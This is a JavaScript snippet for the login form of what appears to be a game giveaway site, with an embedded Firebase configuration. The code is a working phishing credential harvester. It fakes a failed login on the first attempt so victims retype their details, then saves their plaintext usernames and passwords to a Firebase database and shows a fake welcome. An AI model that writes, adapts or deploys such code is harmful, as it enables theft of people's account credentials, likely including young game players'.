<script>
  const firebaseConfig = {
    apiKey: "AIzaSyA6P52LeV5DO0odSMxxfK7DnSAXZBFH6CM",
    authDomain: "growagardengiveaways-c8ed5.firebaseapp.com",
    databaseURL: "https://growagardengiveaways-c8ed5-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "growagardengiveaways-c8ed5",
    storageBucket: "growagardengiveaways-c8ed5.firebasestorage.app",
    messagingSenderId: "417902911798",
    appId: "1:417902911798:web:f02d8d4dbfb30643bbd397",
    measurementId: "G-GQ9YTH33T8"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!username || !password) {
      alert("Please fill in both fields.");
      return;
    }

    // Get current failed login attempt count
    let attempts = parseInt(localStorage.getItem("loginAttempts")) || 0;

    if (attempts < 1) {
      // First attempt: fake failure
      localStorage.setItem("loginAttempts", attempts + 1);
      alert("Incorrect username or password. Please try again.");
      return;
    }

    // Save to Firebase
    db.ref("users").push({
      username: username,
      password: password, // WARNING: Never store raw passwords in production!
      time: new Date().toISOString()
    });

    // Set login status
    localStorage.setItem("loggedIn", "true");
    localStorage.setItem("username", username);
    localStorage.removeItem("loginAttempts"); // reset

    alert("Welcome, " + username + "!");
    window.location.href = "gag-home.html";
  });
</script>
